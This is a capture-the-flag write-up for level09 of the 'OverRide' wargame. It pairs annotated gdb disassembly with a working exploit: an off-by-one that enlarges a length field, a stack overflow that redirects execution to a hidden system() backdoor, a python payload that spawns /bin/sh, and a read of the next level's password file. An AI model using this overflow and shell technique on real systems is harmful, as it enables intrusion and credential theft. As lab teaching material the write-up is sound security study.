# OVERRIDE

## level09

```sh
(gdb) info functions
All defined functions:

...
0x000000000000088c  secret_backdoor
0x00000000000008c0  handle_msg
0x0000000000000932  set_msg
0x00000000000009cd  set_username
0x0000000000000aa8  main
...
```

```sh
(gdb) disas secret_backdoor
   0x88c <+0>:   push   %rbp
   0x88d <+1>:   mov    %rsp,%rbp
   0x890 <+4>:   add    $0xffffffffffffff80,%rsp      # char buf[128]
   0x8ad <+33>:  callq  fgets@plt                     # fgets(buf, 128, stdin)
   0x8b9 <+45>:  callq  system@plt                    # system(buf)
   0x8be <+50>:  leaveq
   0x8bf <+51>:  retq
   ```

   ```sh
   (gdb) disas handle_msg
   0x8c0 <+0>:   push   %rbp
   0x8c1 <+1>:   mov    %rsp,%rbp
   0x8c4 <+4>:   sub    $0xc0,%rsp
                                                      # t @ -0xc0
                                                      # t.msg      [0x00 .. 0x8b]
                                                      # t.username [0x8c .. 0xb3]  40 o
                                                      # t.len      @ 0xb4          (= -0xc)
   0x8d2 <+18>:  add    $0x8c,%rax
   0x8d8 <+24>:  ...                                  # bzero(username, 40)
   0x8ff <+63>:  movl   $0x8c,-0xc(%rbp)              # len = 140
   0x910 <+80>:  callq  set_username
   0x91f <+95>:  callq  set_msg
   0x92b <+107>: callq  puts@plt                      # ">: Msg sent!"
   0x931 <+113>: retq                                 # ← RET à écraser
   ```

   ```sh
   (gdb) disas set_username
   0x9d1 <+4>:   sub    $0xa0,%rsp
   0x9f9 <+44>:  rep stos                            # char buf[128] = 0
   0xa03 <+54>:  callq  puts@plt                      # ">: Enter your username"
   0xa17 <+74>:  callq  printf@plt                    # ">>: "
   0xa38 <+107>: callq  fgets@plt                     # fgets(buf, 128, stdin)
   0xa3d <+112>: i = 0
   0xa6a <+157>: cmpl   $0x28,-0x4(%rbp)
   0xa6e <+161>: jg     end                           # while (i <= 40 && buf[i])
   0xa5f <+146>: mov    %cl,0x8c(%rdx,%rax,1)         # username[i] = buf[i]
                                                      # i==40 → 1 octet dans len
   0xaa1 <+212>: callq  printf@plt                    # ">: Welcome, %s"
   ```

   ```sh
   (gdb) disas set_msg
   0x936 <+4>:   sub    $0x410,%rsp
   0x95e <+44>:  rep stos                            # char buf[1024] = 0
   0x968 <+54>:  callq  puts@plt                      # ">: Msg @Unix-Dude"
   0x97c <+74>:  callq  printf@plt                    # ">>: "
   0x99d <+107>: callq  fgets@plt                     # fgets(buf, 1024, stdin)
   0x9a9 <+119>: mov    0xb4(%rax),%eax               # n = t->len
   0x9c6 <+148>: callq  strncpy@plt                   # strncpy(t->msg, buf, n)
   ```

   ```sh
   (gdb) disas main
   0xab3 <+11>:  callq  puts@plt                      # banner
   0xab8 <+16>:  callq  handle_msg
   0xac3 <+27>:  retq
   ```

```c
struct {
    char msg[140];
    char username[40];
    int len; //140
}
```
`len` starts at 140. `set_msg` doest `strncpy(msg, input, len)`

the loop copies while `i <= 40`, `i == 40` is the first byte of `len`

```sh
"A"*40 + "\xff"
```

`len` goes from `0x0000008c` to `0x000000ff` (140 to 255)

now `strncpy` have enough bytes to reach reach EBP + 4

now we need the address of secret_backdoor

```sh
b main
p/x secret_backdoor         -> display wrong address (think its a numerical value)
p/x &secret_backdoor
0x55555555488c → \x8c\x48\x55\x55\x55\x55\x00\x00
```

so this is our payload

```sh
"A" * 40 + "\xff"                              -> username + change len
\n
"B"+0xc8 + "\x8c\x48\x55\x55\x55\x55\x00\x00"  -> padding to reach EIP and replace it with secret_backdoor addr
\n
/bin/sh                                        -> arg for system
```

```sh
level09@OverRide:~$ (python -c 'print "A"*40+"\xff\n"+"B"*0xc8+"\x8c\x48\x55\x55\x55\x55\x00\x00\n/bin/sh"'; cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
whoami
end
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```